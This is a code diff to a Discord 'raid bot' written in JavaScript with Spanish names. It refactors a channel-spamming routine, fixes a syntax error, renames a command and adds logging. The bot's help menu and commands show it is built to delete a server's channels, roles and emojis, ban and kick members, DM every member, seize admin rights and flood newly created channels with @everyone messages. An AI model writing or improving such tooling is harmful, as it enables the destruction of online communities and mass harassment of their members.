@@ -37,7 +37,7 @@ const CONFIG = {
   RETRY_DELAY: 1000,
   OWNER_ID: process.env.OWNER_ID || null,
   PREFIX: '.',
-  VERSION: '3.0',
+  VERSION: '3.1',
   DEBUG_MODE: process.env.DEBUG_MODE === 'true'
 };
 
@@ -367,40 +367,39 @@ class BotUtils {
     }
   }
 
-  static async spamChannels(channels, msgCount, buildMsg, delay = 100) {
+  static async spamChannels(channels, msgCount, messageBuilder, delay = 100) {
     try {
       let totalSpammed = 0;
-      const result = await this.batchExecute(
-        channels,
-        CONFIG.CONCURRENCY,
-        async (channel) => {
-          if (!channel || !channel.isTextBased()) return 0;
-          let spammed = 0;
-          
-          try {
-            for (let i = 0; i < msgCount; i++) {
-              try {
-                await channel.send(buildMsg());
-                spammed++;
-                totalSpammed++;
-                await this.sleep(delay);
-              } catch (err) {
-                if (err.code !== 50013) {
-                  logger.debug('Error enviando mensaje', { error: err.message, channelId: channel.id });
-                }
-              }
-            }
-          } catch (err) {
-            logger.warn('Error en canal de spam', { error: err.message, channelId: channel.id });
-          }
-          
-          return spammed;
-        },
-        'Spam de mensajes'
-      );
+      const failedChannels = [];
 
-      database.addRaidStat(channels[0]?.guild?.id, 'spam', totalSpammed);
-      logger.success(`Spam completado: ${totalSpammed} mensajes en ${channels.length} canales`);
+      for (const channel of channels) {
+        if (!channel || !channel.isTextBased()) continue;
+
+        try {
+          for (let i = 0; i < msgCount; i++) {
+            try {
+              const msg = messageBuilder();
+              logger.debug(`Enviando mensaje a canal ${channel.id}`, { attempt: i + 1 });
+              await channel.send(msg);
+              totalSpammed++;
+              await this.sleep(delay);
+            } catch (err) {
+              if (err.code !== 50013) {
+                logger.debug('Error enviando mensaje', { error: err.message, channelId: channel.id });
+              }
+              break;
+            }
+          }
+        } catch (err) {
+          failedChannels.push(channel.id);
+          logger.warn('Error en canal de spam', { error: err.message, channelId: channel.id });
+        }
+      }
+
+      if (channels[0]?.guild?.id) {
+        database.addRaidStat(channels[0].guild.id, 'spam', totalSpammed);
+      }
+      logger.success(`Spam completado: ${totalSpammed} mensajes en ${channels.length} canales`, { failed: failedChannels.length });
       return totalSpammed;
     } catch (err) {
       logger.error('Error en spam', { error: err.message });
@@ -639,7 +638,7 @@ const EMBEDS = {
     .setTitle('📋 MENÚ DE AYUDA - Bot Raid')
     .setDescription('**Comandos disponibles:**')
     .addFields(
-      { name: '🔴 DESTRUCTIVOS', value: '`.diversión` | `.bypass <msg>` | `.delroles` | `.delemojis` | `.limpiar` | `.ban` | `.kick` | `.triangulo`', inline: false },
+      { name: '🔴 DESTRUCTIVOS', value: '`.diversion` | `.bypass <msg>` | `.delroles` | `.delemojis` | `.limpiar` | `.ban` | `.kick` | `.triangulo`', inline: false },
       { name: '📧 COMUNICACIÓN', value: '`.md <mensaje>` - Envía DM a todos los miembros', inline: false },
       { name: '👑 ADMIN', value: '`.admin` - Te da rol de administrador', inline: false },
       { name: '🔧 UTILIDADES', value: '`.stats` | `.info` | `.status` | `.clear`', inline: false },
@@ -670,7 +669,7 @@ const EMBEDS = {
       { name: 'Modo Debug', value: CONFIG.DEBUG_MODE ? '🔴 Activado' : '🟢 Desactivado', inline: true },
       { name: 'Servidores', value: `${client.guilds.cache.size}`, inline: true },
       { name: 'Usuario Bot', value: `${client.user.tag}`, inline: true },
-      { name 'ID del Bot', value: client.user.id, inline: true }
+      { name: 'ID del Bot', value: client.user.id, inline: true }
     )
     .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` })
 };
@@ -678,11 +677,11 @@ const EMBEDS = {
 // ==================== COMANDOS ====================
 
 const COMMANDS = {
-  async diversión(message, guild, client, args) {
+  async diversion(message, guild, client, args) {
     try {
-      logger.info('Ejecutando comando: diversión');
+      logger.info('Ejecutando comando: diversion');
       
-      await message.reply({ embeds: [EMBEDS.warning('🚀 Iniciando operación diversión...')] }).catch(() => {});
+      await message.reply({ embeds: [EMBEDS.warning('🚀 Iniciando operación diversion...')] }).catch(() => {});
       
       await BotUtils.deleteAllChannels(guild);
       const { channels: newChannels } = await BotUtils.createChannels(guild, 'TRIANGULITO THE GOAT', CONFIG.MAX_CHANNELS);
@@ -691,7 +690,7 @@ const COMMANDS = {
       await BotUtils.spamChannels(newChannels, msgCount, () => ({
         content: '@everyone',
         embeds: [EMBEDS.invasion()]
-      }));
+      }), 50);
 
       await Promise.all([
         guild.setName('TRIANGULITO GOAT').catch(() => {}),
@@ -699,12 +698,12 @@ const COMMANDS = {
       ]);
 
       database.updateGuildStats(guild.id, { lastRaid: new Date().toISOString(), raidCount: (database.getGuildStats(guild.id).raidCount || 0) + 1 });
-      database.addCommand('diversión', message.author.id, guild.id);
+      database.addCommand('diversion', message.author.id, guild.id);
       
-      logger.success('Comando diversión completado', { guildId: guild.id });
+      logger.success('Comando diversion completado', { guildId: guild.id });
     } catch (err) {
-      logger.error('Error en comando diversión', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error ejecutando diversión')] }).catch(() => {});
+      logger.error('Error en comando diversion', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error ejecutando diversion')] }).catch(() => {});
     }
   },
 
@@ -825,14 +824,25 @@ const COMMANDS = {
 
   async triangulo(message, guild, client, args) {
     try {
+      logger.info('Ejecutando comando: triangulo');
+      
       await BotUtils.deleteAllChannels(guild);
       const { channels: newChannels } = await BotUtils.createChannels(guild, 'TRIANGULITO ES EL MEJOR', CONFIG.MAX_CHANNELS);
       
+      logger.info('Canales creados para triangulo', { count: newChannels.length });
+
       if (BUFFERS.triangulito) {
+        logger.info('Buffer triangulito disponible, iniciando spam');
         await BotUtils.spamChannels(newChannels, 10, () => ({
           content: '@everyone',
           embeds: [EMBEDS.triangulito()],
           files: [new AttachmentBuilder(BUFFERS.triangulito, { name: 'triangulito.webp' })]
+        }), 150);
+      } else {
+        logger.warn('Buffer triangulito no disponible, enviando sin imagen');
+        await BotUtils.spamChannels(newChannels, 10, () => ({
+          content: '@everyone',
+          embeds: [EMBEDS.triangulito()]
         }), 150);
       }
 
